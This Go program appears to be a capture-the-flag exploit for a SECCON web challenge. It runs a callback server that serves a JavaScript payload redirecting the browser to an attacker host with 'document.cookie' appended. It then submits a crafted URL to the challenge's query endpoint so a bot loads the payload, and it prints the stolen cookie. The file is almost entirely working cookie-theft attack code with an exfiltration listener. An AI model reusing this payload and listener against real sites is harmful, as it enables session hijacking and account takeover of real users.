package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

var ctx, cancelFunc = context.WithCancel(context.Background())

type CallbackServer struct{
	msg chan string
	server *http.Server
}

func NewCallbackServer() *CallbackServer {
	callbackServer := &CallbackServer{}

	http.HandleFunc("/", callbackServer.callback)
	http.HandleFunc("/index.js", callbackServer.index)

	return callbackServer
}

func (callbackServer *CallbackServer) Start(addr string) error {
	s := &http.Server{
		Addr:              addr,
	}
	callbackServer.server = s
	return callbackServer.server.ListenAndServe()
}

func (callbackServer *CallbackServer) callback(w http.ResponseWriter, r *http.Request) {
	var msg string
	body, err := ioutil.ReadAll(r.Body)
	for k, v := range r.URL.Query() {
		msg += k
		for _, value := range v {
			msg += value
		}
	}
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprint(w, "Error!")
	}
	msg += string(body)
	fmt.Println("Message Sending...")
	fmt.Println(msg)
	w.Write([]byte("OK"))
	cancelFunc()
}

func (callbackServer *CallbackServer) index(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w,  fmt.Sprintf("location.href = \"http://%s/?\" + document.cookie", os.Getenv("HOST")))
}

func main() {
	c := NewCallbackServer()

	fmt.Fprintln(os.Stderr, "Waiting for prepare server...")

	fmt.Fprintln(os.Stderr, "Preparing Server...")
	go func(){
		fmt.Fprintln(os.Stderr, c.Start(os.Getenv("LISTEN_ADDR")))
	}()
	fmt.Fprintln(os.Stderr, "OK")
	fmt.Fprintln(os.Stderr, "OK, Requesting...s")
	form := url.Values{}
	form.Add("url", "http://spa.chal.seccon.jp:18364/#/"+os.Getenv("HOST")+"/index.js?callback=?&yakuza")

	body := strings.NewReader(form.Encode())

	// param := "url=" + url.QueryEscape("http://spa.chal.seccon.jp:18364/#/8375a862.ngrok.io/index.js?callback=?&yakuza")
	fmt.Fprintln(os.Stderr, body)


	request, error := http.NewRequest("POST", "http://spa.chal.seccon.jp:18364/query", body)
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	if error != nil {
		log.Fatal(error)
	}

	http.DefaultClient.Do(request)
	fmt.Fprintln(os.Stderr, "Requested")
	select {
	case <-ctx.Done():
		c.server.Shutdown(context.Background())
	}
}